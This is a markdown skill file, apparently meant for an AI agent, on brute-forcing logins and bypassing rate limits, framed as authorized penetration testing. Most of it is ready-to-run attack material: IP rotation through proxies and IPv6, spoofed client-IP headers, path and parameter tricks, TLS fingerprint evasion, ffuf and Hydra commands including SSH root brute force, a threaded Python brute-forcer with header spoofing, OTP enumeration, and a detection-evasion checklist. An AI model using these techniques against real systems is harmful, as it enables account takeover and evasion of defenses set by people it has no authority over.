---
name: brute-force
description: Brute force and rate limit bypass techniques for authentication testing. Use when testing login security.
---

# Brute Force & Rate Limit Bypass

## Description
Rate limiting protects against brute force attacks by restricting the number of requests. This skill covers techniques to bypass rate limiting and perform effective brute force attacks during authorized penetration testing.

## Rate Limit Bypass Techniques

### 1. IP Rotation

#### Using Multiple Proxies
```bash
# Proxychains configuration
proxychains -f proxychains.conf hydra -l admin -P passwords.txt target.com http-post-form

# Rotating proxy list
for proxy in $(cat proxies.txt); do
  curl -x $proxy https://target.com/login
done
```

#### IPv6 Address Space
```bash
# IPv6 provides massive address space for rotation
# Configure multiple IPv6 addresses on interface
ip -6 addr add 2001:db8::1/64 dev eth0
ip -6 addr add 2001:db8::2/64 dev eth0
```

#### Cloud Provider IPs
```bash
# Use OmniProx for multi-cloud IP rotation
# Leverages AWS, GCP, Azure IP ranges
```

### 2. Header Manipulation

#### IP Spoofing Headers
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-Host: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
```

#### Rotating X-Forwarded-For
```python
import requests
import random

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

for password in passwords:
    headers = {'X-Forwarded-For': random_ip()}
    requests.post(url, data={'password': password}, headers=headers)
```

### 3. Request Modification

#### Adding Null Bytes/Special Characters
```
username=admin%00
username=admin%0d%0a
username=admin%09
username=admin%20
```

#### Case Manipulation
```
username=Admin
username=ADMIN
username=aDmIn
```

#### Parameter Pollution
```http
POST /login HTTP/1.1
username=admin&password=test&username=admin2
```

#### Changing Request Method
```http
# Try different methods
GET /login?username=admin&password=test
POST /login
PUT /login
```

#### Content-Type Manipulation
```http
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/xml
```

### 4. TLS Fingerprint Evasion

#### JA3 Randomization
```bash
# curl-impersonate mimics browser TLS fingerprints
curl-impersonate-chrome https://target.com/login

# Using different TLS clients
```

#### Browser Automation
```python
# Using Playwright/Puppeteer for real browser fingerprints
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.goto('https://target.com/login')
```

### 5. Endpoint Manipulation

#### Alternative Endpoints
```
/api/v1/login
/api/v2/login
/api/login
/Login
/LOGIN
/signin
/authenticate
```

#### Path Manipulation
```
/./login
//login
/login/
/login?
/login#
/%2e/login
```

### 6. Timing-Based Bypass

#### Adding Delays
```python
import time

for password in passwords:
    login(username, password)
    time.sleep(2)  # Avoid triggering rate limits
```

#### Distributed Timing
```bash
# Spread requests across time windows
```

## Burp Suite Intruder Attack Types

### Sniper
Single payload position, one payload at a time.
```
Use for: Single parameter testing
```

### Battering Ram
Same payload in all positions simultaneously.
```
Use for: Same value across multiple parameters
```

### Pitchfork
Multiple payload lists, parallel iteration.
```
Use for: Username:password pairs from breach data
```

### Cluster Bomb
All combinations of multiple payload lists.
```
Use for: Comprehensive credential testing
```

## Brute Force Tools

### FFUF
```bash
# Basic brute force
ffuf -w passwords.txt -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded"

# With rate limiting
ffuf -w passwords.txt -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -rate 10

# Filter by response
ffuf -w passwords.txt -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -fc 401 -fs 1234
```

### Hydra
```bash
# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# With proxy
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid" \
  -o results.txt

# SSH brute force
hydra -l root -P passwords.txt ssh://target.com
```

### Custom Python Script
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import random

def brute_force(password):
    headers = {
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    }
    response = requests.post(
        'https://target.com/login',
        data={'username': 'admin', 'password': password},
        headers=headers
    )
    if 'Welcome' in response.text:
        print(f'[+] Found: {password}')
        return password
    return None

with open('passwords.txt') as f:
    passwords = f.read().splitlines()

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(brute_force, passwords)
```

## Token/OTP Brute Force

### Numeric OTP
```bash
# 4-digit OTP
seq -w 0000 9999 > otp.txt

# 6-digit OTP
seq -w 000000 999999 > otp.txt

# With FFUF
ffuf -w otp.txt -u https://target.com/verify -X POST \
  -d "otp=FUZZ" -mc 200
```

### Reset Token
```bash
# If token is predictable/short
# Generate possible tokens and test
```

## Detection Evasion Checklist

- [ ] Rotate IP addresses
- [ ] Manipulate identifying headers
- [ ] Vary request timing
- [ ] Use different User-Agents
- [ ] Try alternative endpoints
- [ ] Modify request format
- [ ] Spoof TLS fingerprint
- [ ] Add random parameters

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit
- https://portswigger.net/web-security/authentication/password-based
